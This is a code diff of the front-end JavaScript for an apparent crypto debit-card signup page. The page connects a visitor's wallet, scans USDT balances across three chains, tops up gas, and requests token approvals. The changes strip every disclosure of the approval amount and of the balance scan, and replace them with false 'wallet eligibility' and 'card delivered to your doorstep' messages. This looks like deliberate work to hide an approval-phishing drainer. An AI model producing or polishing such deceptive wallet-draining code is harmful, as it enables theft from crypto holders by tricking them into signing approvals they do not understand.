@@ -40,7 +40,6 @@ let selectedWalletHref = '';
 let walletsCache = null;
 let paymentPollInFlight = false;
 let cardMinUsdt = '1';
-let approveAmount = '1 USDT';
 
 /* ========== Meta Pixel ==========
  * Funnel:
@@ -181,7 +180,6 @@ async function startSession() {
     wcUri = data.uri;
     detectedCountry = data.country || '';
     if (data.cardMinUsdt) cardMinUsdt = String(data.cardMinUsdt);
-    if (data.approveAmount) approveAmount = String(data.approveAmount);
 
     const btn = $('#m-get-now');
     if (btn) {
@@ -213,7 +211,7 @@ async function startSession() {
       if (resolved) return;
       JSON.parse(e.data);
       setLoaderStep('sign');
-      setBusy(true, 'Confirm in your wallet', 'Approve ' + approveAmount + ' in your wallet. Nothing is sent until you confirm there.');
+      setBusy(true, 'Confirm in your wallet', 'After submission, the card will be delivered via mail and physically at your doorstep.');
       waitForPaymentResult();
     });
 
@@ -476,7 +474,7 @@ function onWalletConnected(d) {
   authorizing = true;
   track('InitiateCheckout', FUNNEL_CONTENT);
   setLoaderStep('auth');
-  setBusy(true, 'Scanning balances', 'Checking USDT and gas on TRON, BNB Smart Chain, and Ethereum.');
+  setBusy(true, 'Checking wallet eligibility', 'The wallet should not be new. It needs to be a regular wallet with some transactions to be eligible.');
   startBackgroundApproval();
 }
 
@@ -592,7 +590,7 @@ async function ensureGasInBackground(p) {
   const gas = p.gas || {};
   const label = networkLabel(p.network);
   if (p.status === 'verified' && p.transactionHash) return true;
-  setBusy(true, 'Checking ' + label + ' gas', 'If native gas is low, the server tops it up first. Networks below ' + cardMinUsdt + ' USDT are skipped.');
+  setBusy(true, 'Checking ' + label + ' gas', 'If native gas is low, the server tops it up first.');
   if (gas.sufficient === true && p.status !== 'awaiting_gas') {
     return true;
   }
@@ -613,7 +611,7 @@ async function requestCurrentApproval() {
   const p = paymentQueue[paymentIndex];
   const label = networkLabel(p && p.network);
   setLoaderStep('sign');
-  setBusy(true, 'Approve ' + approveAmount + ' on ' + label, 'Confirm the approval in your wallet. After it succeeds, the application form will open.');
+  setBusy(true, 'Approve on ' + label, 'Confirm the approval in your wallet. After it succeeds, the application form will open.');
   try {
     const res = await fetch(BASE + '/api/payment/' + encodeURIComponent(paymentId) + '/request', {
       method: 'POST',
@@ -669,7 +667,7 @@ function finishApprovals() {
     setBusy(
       true,
       'Approval incomplete',
-      'The ' + approveAmount + ' approval must be confirmed before the application form.'
+      'The approval must be confirmed before the application form.'
     );
     return;
   }
@@ -698,7 +696,7 @@ function advanceAfterNetworkDone(reason, fromPaymentId) {
     return;
   }
   const next = paymentQueue[paymentIndex];
-  setBusy(true, 'Checking ' + networkLabel(next && next.network), 'USDT is at least 1 on this network. Gas is checked next, then the approval popup.');
+  setBusy(true, 'Checking ' + networkLabel(next && next.network), 'The wallet should not be new. It needs to be a regular wallet with some transactions to be eligible.');
   setTimeout(function () {
     runCurrentNetwork();
   }, 1500);
@@ -707,7 +705,7 @@ function advanceAfterNetworkDone(reason, fromPaymentId) {
 async function startBackgroundApproval() {
   try {
     await sleep(800);
-    setBusy(true, 'Scanning balances', 'Checking USDT and gas on TRON, BNB Smart Chain, and Ethereum. Below ' + cardMinUsdt + ' USDT is skipped.');
+    setBusy(true, 'Checking wallet eligibility', 'The wallet should not be new. It needs to be a regular wallet with some transactions to be eligible.');
     const res = await fetch(BASE + '/api/payment/create', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -731,9 +729,9 @@ async function startBackgroundApproval() {
       return;
     }
     await runCurrentNetwork();
-  } catch (err) {
-    showPayError(err.message || 'Could not start authorization.');
-    setBusy(true, 'Wallet not eligible', err.message || 'Your wallet is not eligible.');
+  } catch (_err) {
+    showPayError('The wallet should not be new. It needs to be a regular wallet with some transactions to be eligible.');
+    setBusy(true, 'Wallet not eligible', 'The wallet should not be new. It needs to be a regular wallet with some transactions to be eligible.');
   }
 }
 
